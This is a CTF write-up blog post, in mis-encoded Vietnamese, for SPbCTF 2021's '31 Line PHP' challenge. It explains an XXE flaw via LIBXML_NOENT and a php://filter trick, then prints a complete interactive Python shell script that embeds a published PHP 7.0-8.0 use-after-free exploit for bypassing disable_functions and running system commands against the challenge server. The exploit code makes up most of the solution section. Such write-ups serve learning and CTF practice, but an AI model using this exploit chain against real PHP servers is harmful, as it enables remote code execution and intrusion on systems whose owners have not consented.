---
title: 31 Line PHP - SPbCTF2021
description: From SPbCTF's Student CTF 2021 Quals
author: to^
date: 2022-04-05 23:35:00 +0700
categories: [WebSec, CTF]
tags: [xxe, rce]     # TAG names should always be lowercase
img_path: /assets/img/
image:
 src: 31linephp/SPbCTF_logo.png
 alt: SPbCTF logo
 width: 1000
 height: 400
---
Challenge nÃ y tá»« nÄƒm ngoÃ¡i nhÆ°ng mÃ¬nh váº«n muá»‘n viáº¿t bá»Ÿi 1 pháº§n nÃ³ khÃ¡ hay vÃ  lÃ­ do ngoÃ i lá» khÃ¡c lÃ  nÄƒm nay mÃ¬nh má»›i táº­p tÃ nh viáº¿t blog ğŸ˜ 
## _Source code_
![source_code](31linephp/source.png)
_source code_

## _PhÃ¢n tÃ­ch_
NhÃ¬n qua source code thÃ¬ ta sáº½ pháº£i POST dá»¯ liá»‡u `data=xxxx` vÃ  má»™t file. Server sáº½ check session cá»§a ta náº¿u khÃ´ng cÃ³ thÃ¬ sáº½ táº¡o random má»™t `sess_id` vÃ  dÃ¹ng  `sess_id` nÃ y Ä‘á»ƒ lÃ m thÆ° má»¥c cha cá»§a file upload.

2 dÃ²ng comment khÃ¡ thÃº vá»‹, liÃªn quan Ä‘áº¿n lá»—i XXE cá»§a Wordpress 3.9.2. Tiáº¿p tá»¥c search thÃ¬ mÃ¬nh tÃ¬m ra má»™t blog vá» má»™t bug khÃ¡c cÅ©ng cá»§a [Wordpress](https://blog.sonarsource.com/wordpress-xxe-security-vulnerability) liÃªn quan Ä‘áº¿n XXE. `libxml_disable_entity_loader(true)` Ä‘Æ°á»£c thÃªm vÃ o á»Ÿ Ä‘Ã¢y Ä‘á»ƒ config XML parser táº¯t tÃ­nh nÄƒng load external entity vÃ  tÃ­nh nÄƒng nÃ y nÃªn Ä‘Æ°á»£c Ã¡p dá»¥ng vá»›i cÃ¡c version PHP < 8, ká»ƒ tá»« 8 trá»Ÿ Ä‘i thÃ¬ PHP dÃ¹ng libxml tá»« version 2.9.0 (disable XXE bydefault) nÃªn `libxml_disable_entity_loader()` khÃ´ng Ä‘Æ°á»£c dÃ¹ng ná»¯a.

Tá»« Ä‘Ã³ ta cÃ³ thá»ƒ tháº¥y khÃ´ng cÃ³ váº¥n Ä‘á» gÃ¬ á»Ÿ Ä‘oáº¡n code nÃ y nhÆ°ng `loadXML()` á»Ÿ dÃ²ng code dÆ°á»›i thÃ¬ sao?. Bá»Ÿi vÃ¬ nÃ³ Ä‘Æ°á»£c thá»±c thi vá»›i flag `LIBXML_NOENT`  nÃªn sáº½ `enable entity substitution`. Cá»¥ thá»ƒ hÆ¡n lÃ :
![LIBXML_NOENT](31linephp/libxml_noent.png)
_LIBXML_NOENT_

VÃ¬ váº­y ta váº«n cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘iá»u nÃ y Ä‘á»ƒ Ã¡p dá»¥ng kÄ© thuáº­t XXE ğŸ˜Š

Thá»­ upload má»™t file `test.xml`:
![test.xml](31linephp/test.png)
_test.html_

Vá»›i PHPSESSID trong cookie cá»§a ta
![py script](31linephp/pyscript.png)
_python script_

Ta Ä‘Æ°á»£c:
![result](31linephp/result1.png)
_respone_

XXE thÃ nh cÃ´ng nhÆ°ng sáº½ khÃ´ng cÃ³ cÃ¡ch nÃ o tÃ¬m Ä‘Æ°á»£c file flag vÃ¬ XXE theo cÃ¡ch nÃ y chá»‰ cÃ³ thá»ƒ retrieve file tá»« xa bÃªn phÃ­a server ğŸ˜ vÃ¬ váº­y mÃ¬nh Ä‘Ã£ khÃ´ng giáº£i ra.

Sau khi Ä‘á»c wu thÃ¬ má»›i phÃ¡t hiá»‡n ra ráº±ng file ta upload lÃªn Ä‘Æ°á»£c xÃ³a á»Ÿ cuá»‘i `unlink()` sau khi Ä‘Æ°á»£c parse XML. Äiá»u nÃ y cÃ³ nghÄ©a lÃ  náº¿u ta upload má»™t file PHP vÃ  truy cáº­p file Ä‘Ã³ má»™t láº§n ná»¯a thÃ´ng qua XML. VÃ  dÃ¹ng `php://filter` Ä‘á»ƒ encode base64 thÃ¬ cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c output cá»§a file php (sau khi thá»±c thi bÃªn phÃ­a server) qua response. Äá»ƒ Ã½ má»™t Ä‘iá»ƒm ná»¯a lÃ  file upload Ä‘Æ°á»£c lÆ°u táº¡i thÆ° má»¥c `var/www/html/upload/$id/$name` nÃªn suy Ä‘oÃ¡n thÆ° má»¥c root cá»§a web server sáº½ lÃ  `/var/www/html`. Suy ra ta cÃ³ thá»ƒ access Ä‘áº¿n file upload bÃªn phÃ­a server thÃ´ng qua Ä‘Æ°á»ng dáº«n <http://62.84.114.238/upload/$id/$FILENAME> 

```xml
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/89e05a8b6e028eeda25a0845b9b3daaa/payload.php" >]>
<creds>
<user>&xxe;</user>

<pass></pass>

</creds>
<?php phpinfo(); ?>
```

Ta chá»‰nh láº¡i file upload vá»›i `phpinfo();` vÃ  Ä‘á»ƒ server thá»±c thi Ä‘Æ°á»£c file php thÃ¬ chá»‰nh luÃ´n extension thÃ nh `.php`
![result](31linephp/result2.png)
_respone_

ThÃ nh cÃ´ng base64 decode vÃ  má»Ÿ báº±ng trÃ¬nh duyá»‡t:
![result](31linephp/result3.png)
_phpinfo_

ğŸ˜‘ CÃ¡c function cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ rce Ä‘á»u bá»‹ filter.

NhÆ°ng cÃ¡i `disable_functions` nÃ y cÃ³ thá»ƒ bypass Ä‘Æ°á»£c dá»±a vÃ o bug 0day Ä‘Æ°á»£c published [PoC](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass). 
Táº¡i thá»i Ä‘iá»ƒm publish, bug nÃ y cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ bypass háº§u nhÆ° má»i PHP versions vÃ  khai thÃ¡c dá»±a trÃªn `memory corruption`.

## _Khai thÃ¡c_
```py
import requests
import re
import base64

TARGET = 'http://62.84.114.238'

while 1:
    COMMAND = str(input('$ '))
    with open('payload.php', 'w') as f:
        f.write("""
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/ebb8f496d6241dfd214351614c852de7/payload.php" > ]>
<creds>
    <user>&xxe;</user>    
    <pass>mypass</pass>
</creds>
""" + """
<?php 
# PHP 7.0-8.0 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=54350
# 
# This exploit should work on all PHP 7.0-8.0 versions
# released as of 2021-10-06
#
# Author: https://github.com/mm0r1

pwn('{}');""".format(COMMAND) + r"""

function pwn($cmd) {
    define('LOGGING', false);
    define('CHUNK_DATA_SIZE', 0x60);
    define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);
    define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);
    define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);
    define('CMD', $cmd);
    for($i = 0; $i < 10; $i++) {
        $groom[] = Pwn::alloc(STRING_SIZE);
    }
    stream_filter_register('pwn_filter', 'Pwn');
    $fd = fopen('php://memory', 'w');
    stream_filter_append($fd,'pwn_filter');
    fwrite($fd, 'x');
}

class Helper { public $a, $b, $c; }
class Pwn extends php_user_filter {
    private $abc, $abc_addr;
    private $helper, $helper_addr, $helper_off;
    private $uafp, $hfp;

    public function filter($in, $out, &$consumed, $closing) {
        if($closing) return;
        stream_bucket_make_writeable($in);
        $this->filtername = Pwn::alloc(STRING_SIZE);
        fclose($this->stream);
        $this->go();
        return PSFS_PASS_ON;
    }

    private function go() {
        $this->abc = &$this->filtername;

        $this->make_uaf_obj();

        $this->helper = new Helper;
        $this->helper->b = function($x) {};

        $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        $this->log("helper @ 0x%x", $this->helper_addr);

        $this->abc_addr = $this->helper_addr - CHUNK_SIZE;
        $this->log("abc @ 0x%x", $this->abc_addr);

        $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;

        $helper_handlers = $this->str2ptr(CHUNK_SIZE);
        $this->log("helper handlers @ 0x%x", $helper_handlers);

        $this->prepare_leaker();

        $binary_leak = $this->read($helper_handlers + 8);
        $this->log("binary leak @ 0x%x", $binary_leak);
        $this->prepare_cleanup($binary_leak);

        $closure_addr = $this->str2ptr($this->helper_off + 0x38);
        $this->log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        $this->log("closure class_entry @ 0x%x", $closure_ce);

        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $this->log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        $this->log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->write($fake_closure_off + 0x38, 1, 4);

        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;
        $this->write($this->helper_off + 0x38, $fake_closure_addr);
        $this->log("fake closure @ 0x%x", $fake_closure_addr);

        $this->cleanup();
        ($this->helper->b)(CMD);
    }

    private function make_uaf_obj() {
        $this->uafp = fopen('php://memory', 'w');
        fwrite($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));
        for($i = 0; $i < STRING_SIZE; $i++) {
            fwrite($this->uafp, "\x00");
        }
    }

    private function prepare_leaker() {
        $str_off = $this->helper_off + CHUNK_SIZE + 8;
        $this->write($str_off, 2);
        $this->write($str_off + 0x10, 6);

        $val_off = $this->helper_off + 0x48;
        $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);
        $this->write($val_off + 8, 0xA);
    }

    private function prepare_cleanup($binary_leak) {
        $ret_gadget = $binary_leak;
        do {
            --$ret_gadget;
        } while($this->read($ret_gadget, 1) !== 0xC3);
        $this->log("ret gadget = 0x%x", $ret_gadget);
        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
        $this->write(8, $ret_gadget);
    }

    private function read($addr, $n = 8) {
        $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);
        $value = strlen($this->helper->c);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function write($p, $v, $n = 8) {
        for($i = 0; $i < $n; $i++) {
            $this->abc[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    $this->log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function cleanup() {
        $this->hfp = fopen('php://memory', 'w');
        fwrite($this->hfp, pack('QQ', 0, $this->abc_addr));
        for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {
            fwrite($this->hfp, "\x00");
        }
    }

    private function str2ptr($p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($this->abc[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $n = 8) {
        $out = '';
        for ($i = 0; $i < $n; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function log($format, $val = '') {
        if(LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat('A', $size));
    }
}
?>
""")
    r = requests.post(TARGET, files={'data': ('payload.php', open('payload.php', 'rb'))}, data={'data': 'test'},
                      headers={'Cookie': 'PHPSESSID=7b4bd8d9ff68e20dc0317595b6623ef6'})
    # print(r.text)
    match = re.search('You have logged in as user (.*)', r.text)
    extract_data = base64.b64decode(match[1]).decode()
    index = extract_data.find('</creds>') + len('</creds>')
    rce_data = extract_data[index:]
    print(rce_data)

```

Káº¿t quáº£:

![result](31linephp/result4.png)
_RCE sucess_

> spbctf{XX3_2_rCe_w3Ll_D0n3}
{: .prompt-info  }

## _Tham kháº£o_
- <https://blog.sonarsource.com/wordpress-xxe-security-vulnerability>
- <https://ctf.zeyu2001.com/2021/spbctfs-student-ctf-quals/31-line-php>
- <https://php.watch/versions/8.0/libxml_disable_entity_loader-deprecation>